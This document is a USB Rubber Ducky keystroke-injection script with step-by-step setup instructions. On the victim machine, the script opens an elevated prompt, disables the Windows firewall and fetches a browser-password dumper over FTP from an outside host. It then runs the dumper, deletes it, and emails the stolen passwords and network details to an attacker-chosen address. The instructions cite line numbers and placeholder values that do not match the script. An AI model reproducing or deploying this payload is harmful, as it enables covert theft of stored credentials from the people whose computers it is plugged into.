```
DELAY 800
GUI
DELAY 800
STRING Command Prompt
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 1500
STRING mkdir C:\DuckyReport
ENTER
STRING netsh advfirewall set allprofiles state off
ENTER
STRING ipconfig > C:\DuckyReport\ipconfig.txt
ENTER
STRING cd C:\DuckyReport
ENTER
STRING ftp
ENTER
STRING open ftp.drivehq.com
ENTER
DELAY 2500
STRING YourDriveHQUsername
ENTER
DELAY 2500
STRING YourDriveHQPassword
ENTER
DELAY 2500
STRING get BPD.exe
ENTER
DELAY 8000
STRING close
ENTER
DELAY 800
STRING quit
ENTER
DELAY 800
STRING BPD.exe -f BPD.txt
ENTER
DELAY 2500
STRING del BPD.exe
ENTER
DELAY 800
STRING Exit
ENTER
DELAY 800
GUI
DELAY 1000
STRING Powershell
ENTER
DELAY 1000
STRING $emailSmtpServer = "smtp.gmail.com";$emailSmtpServerPort = "587";$emailSmtpUser = "yourgmailusername@gmail.com";$emailSmtpPass = "YourGmailPassword";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = "DuckyScript Browser Passwords <YourEmailAddressHere@gmail.com>";$emailMessage.To.Add("EmailToSendTo@example.com");$emailMessage.Body = "See attachments";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = "C:\DuckyReport\BPD.txt";$emailMessage.Attachments.Add($attachment);$attachment2 = "C:\DuckyReport\ipconfig.txt";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);
ENTER
DELAY 5000
STRING exit
ENTER
```


## Instructions:
1. Create an free account at [https://www.drivehq.com/features/ftp.aspx](https://www.drivehq.com/features/ftp.aspx)
2. Download BPD.zip and extract it from [https://drive.google.com/file/d/0B8k1o3N-X4vZVjNwZm5ac2hZNFE/view?usp=sharing](https://drive.google.com/file/d/0B8k1o3N-X4vZVjNwZm5ac2hZNFE/view?usp=sharing)
3. Go to your account and upload BPD.exe to the root directory.
4. In the script please change the following to your information:
    On line 22 ```STRING YourDriveHQUsername``` change ___YourDriveHQUsername___ to your username for www.drivehq.com

    On line 25 ```STRING YourDriveHQPassword``` change ___YourDriveHQPassword___ to your password for www.drivehq.com

    On line 51 ```$emailSmtpUser = "alibefree884@gmail.com";``` This the account email used to send the email with 
        the passwords list. It is only set to use a gmail address. Change ___alibefree884@gmail.com___ to your email. 
        Leave the quotation marks on both sides there.

    On line 51 ```$emailSmtpPass = "alibefree884@gmail.com";``` change ___alibefree884@gmail.com___ to the password for your account 
        but leave the quotation marks on both sides there.

    On line 51 ```$emailMessage.From = "DuckyScript Browser Passwords <YourEmailAddressHere@gmail.com>";``` change 
        ___alibe ___ to your email address. Please leave the brackets on either side of the email 
        address.
    On line 51 ```$emailMessage.To.Add("EmailToSendTo@example.com");``` change ___EmailToSendTo@example.com___ to whatever 
        email you are sending the files to. Leave the quotation marks on both sides there.

5. Load the script on your USB RubberDucky and you are ready to do some reconnaissance.